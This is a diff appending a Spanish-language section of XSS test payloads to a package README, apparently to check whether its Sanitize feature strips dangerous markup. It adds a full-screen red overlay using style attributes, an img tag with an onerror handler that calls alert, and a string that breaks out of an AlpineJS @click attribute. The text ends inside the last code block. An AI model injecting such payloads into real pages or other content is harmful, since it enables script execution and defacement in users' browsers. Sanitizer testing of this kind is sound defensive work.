@@ -54,3 +54,20 @@ npm run build
 ## 📦 Distribution
 
 The compiled JavaScript and type definitions are available in the `dist/` directory after building.
+
+
+---
+
+# 🪓 El "README del Apocalipsis"
+
+<div align="center" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,0,0,0.9); z-index:9999; pointer-events:all;">
+    <h1 style="color:white; padding-top:20%;">TU SITIO HA SIDO INTERCEPTADO</h1>
+    <p style="color:white;">Si ves este fondo rojo, tu Sanitize no está filtrando el atributo 'style'.</p>
+    <img src="x" onerror="alert('XSS Básico: Atributo onerror ejecutado')">
+</div>
+
+## 1. El Quiebra-Alpine (Breakout Attack)
+Este bloque está diseñado para cerrar prematuramente el string de tu atributo `@click` y ejecutar código arbitrario en el navegador del usuario al procesar el botón de copia.
+
+```javascript
+'); alert('XSS vía AlpineJS exitoso'); // '
